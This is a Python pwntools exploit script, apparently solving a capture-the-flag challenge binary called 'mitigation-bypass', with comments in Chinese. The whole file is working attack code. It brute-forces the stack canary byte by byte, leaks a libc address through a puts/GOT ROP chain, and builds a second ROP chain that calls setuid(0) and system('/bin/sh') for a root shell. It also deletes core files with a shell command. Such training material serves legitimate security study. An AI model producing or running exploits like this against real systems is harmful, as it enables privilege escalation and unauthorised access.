#!/usr/bin/env python

import os
from pwn import *

# context.log_level = "debug"

proc = process("/challenge/mitigation-bypass")
# proc = process("./mitigation-bypass")

payload0 = cyclic(0x68)  # buf
# byte_by_byte爆破stack_canary
for i in range(8):
    for stack_canary in range(0x100):
        tmp_payload = payload0 + stack_canary.to_bytes(1, byteorder="little")
        proc.sendafter(b"Input something to pwn me :)\n", tmp_payload)
        line = proc.recvline()
        if (line == b"have fun\n"):
            # 猜中了一位，继续下一位
            print("{} byte : {}".format(i, hex(stack_canary)))
            payload0 += stack_canary.to_bytes(1, byteorder="little")
            break

print(payload0)
print(hex(len(payload0)))
payload0 += cyclic(0x8)  # saved_rbp

# 删除产生的core文件
os.system("rm -rf core.*")

# 利用puts输出got表，泄漏出libc地址
pop_rdi_addr = 0x4013e3 # pop rdi; ret
puts_addr = 0x4010C0
puts_got_addr = 0x404020
libc_puts_offset = 0x84420
read_input_addr = 0x4012A2

payload = payload0
payload += p64(pop_rdi_addr)
payload += p64(puts_got_addr) # rdi = puts_got

payload += p64(puts_addr) # puts(puts_got)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)
data = proc.readline()[:-1]
print(data)
libc_base = int.from_bytes(data, byteorder="little") - libc_puts_offset
print("libc addr : ", hex(libc_base))

# gadgets
pop_rdi_offset = 0x23b6a # pop rdi; ret
pop_rsi_offset = 0x2601f # pop rsi; ret
pop_rdx_offset = 0x142c92 # pop rdx; ret
ret_offset = 0x23b6b # ret


sh_str_offset = 0x1b45bd # /bin/sh
setuid_offset = 0xe4150
system_offset = 0x52290


# setuid(0) system开启shell
payload = payload0

payload += p64(pop_rdi_offset+libc_base)
payload += p64(0) # rdi=0

payload += p64(setuid_offset+libc_base) # setuid(0)

payload += p64(pop_rdi_offset+libc_base)
payload += p64(sh_str_offset+libc_base) # rdi="/bin/sh"

payload += p64(system_offset+libc_base) # system("/bin/sh")

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)

proc.interactive()
